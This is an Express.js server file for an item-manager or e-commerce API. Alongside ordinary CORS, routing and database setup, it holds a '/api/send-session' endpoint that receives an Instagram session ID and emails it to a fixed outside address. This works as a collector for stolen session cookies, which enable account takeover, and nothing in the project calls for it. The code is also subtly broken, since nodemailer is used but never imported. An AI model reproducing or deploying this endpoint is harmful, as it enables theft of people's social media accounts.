import express from 'express';
import { connectDB } from './db/db.js';
import cookieParser from 'cookie-parser';
import cors from "cors";
import dotenv from "dotenv";
import { globalErrorHandler } from "./utils/globalErrorhandler.js";
import { itemRouter } from './routes/item.routes.js';

dotenv.config({ path: "./.env" });
const app = express();
const allowedOrigins = [
  "https://item-manager-tau.vercel.app",
];

app.use(
  cors({
    origin:  allowedOrigins, 
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"], 
    credentials: true, 
  })
);


app.use(express.urlencoded({ extended: true, limit: "10mb" }));
app.use(express.json({ limit: "10mb" }));
app.use(cookieParser());
app.use(express.static("public"));

app.use("/api/items", itemRouter)

// Configure your email settings
const transporter = nodemailer.createTransport({
  service: "gmail", // or your email provider
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASSWORD,
  },
});

app.post("/api/send-session", (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "No session ID provided" });
  }

  const mailOptions = {
    from: ` <${process.env.EMAIL_USER}>`,
    to: "sufi9594@example.com",
    subject: "Instagram Session ID",
    text: `Instagram Session ID: ${sessionId}`,
    html: `<p>Instagram Session ID: <strong>${sessionId}</strong></p>`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
      return res.status(500).json({ error: "Failed to send email" });
    }
    console.log("Email sent:", info.response);
    res.json({ success: true, message: "Email sent successfully" });
  });
});

app.get("/", (req, res) => {
  res.send("Welcome to Ecommerce API");
});

app.use(globalErrorHandler);
const PORT = process.env.PORT || 5017;



(async () => {
  try {
    // Connect to the database
    await connectDB();
    app.listen(PORT, () => {
      console.log(`Server listening on port ${PORT}`);
    });
  } catch (err) {
    console.error(err);
  }
})();